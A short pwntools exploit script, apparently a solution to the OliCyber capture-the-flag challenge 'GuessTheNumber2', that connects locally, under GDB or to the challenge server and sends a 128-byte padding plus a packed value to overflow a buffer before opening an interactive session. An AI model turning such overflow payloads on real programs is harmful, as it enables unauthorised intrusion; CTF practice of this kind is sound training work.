from pwn import *

elf = context.binary = ELF('./GuessTheNumber2')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("gtn2.challs.olicyber.it", 10023)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    ''')
else:
    conn = elf.process()

conn.recvuntil(b"scores:")
#conn.send(cyclic(0x80))
conn.send(b'A'*128 + p64(0x000010) + b'0'*8)
conn.interactive()